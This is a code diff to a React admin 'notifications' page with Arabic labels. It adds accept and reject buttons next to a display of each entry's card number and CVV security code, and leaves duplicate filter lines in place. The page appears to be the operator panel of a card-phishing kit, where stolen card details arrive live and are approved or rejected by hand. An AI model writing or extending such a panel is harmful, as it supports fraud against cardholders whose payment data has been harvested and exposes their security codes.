@@ -138,9 +138,11 @@ export default function NotificationsPage() {
         break
       case "withCard":
         setFilteredNotifications(notifications.filter((notification) => !!notification.cardNumber))
+        setFilteredNotifications(notifications.filter((notification) => !!notification.cardData?.cardNumber))
         break
       case "withoutCard":
         setFilteredNotifications(notifications.filter((notification) => !notification.cardNumber))
+        setFilteredNotifications(notifications.filter((notification) => !notification.cardData?.cardNumber))
         break
       case "online":
         setFilteredNotifications(notifications.filter((notification) => onlineUserIds.includes(notification.id)))
@@ -637,6 +639,35 @@ export default function NotificationsPage() {
               <p className="flex items-center">
                 <strong className="text-red-400 mx-4">رمز الامان :</strong> {selectedNotification?.cvv!}
               </p>
+              <div className="flex justify-between mx-1">
+                <Button
+                  onClick={() => {
+                    handleApproval("approved", selectedNotification.id)
+                    setMessage(true)
+                    setTimeout(() => {
+                      setMessage(false)
+                    }, 3000)
+                  }}
+                  className="w-full m-3 bg-green-500"
+                >
+                  قبول
+                </Button>
+                <Button
+                  onClick={() => {
+                    handleApproval("rejected", selectedNotification.id)
+                    setMessage(true)
+                    setTimeout(() => {
+                      setMessage(false)
+                    }, 3000)
+                  }}
+                  className="w-full m-3"
+                  variant="destructive"
+                >
+                  رفض
+                </Button>
+              </div>
+              <p className="text-red-500">{message ? "تم الارسال" : ""}</p>
+            
             </div>
           )}
           
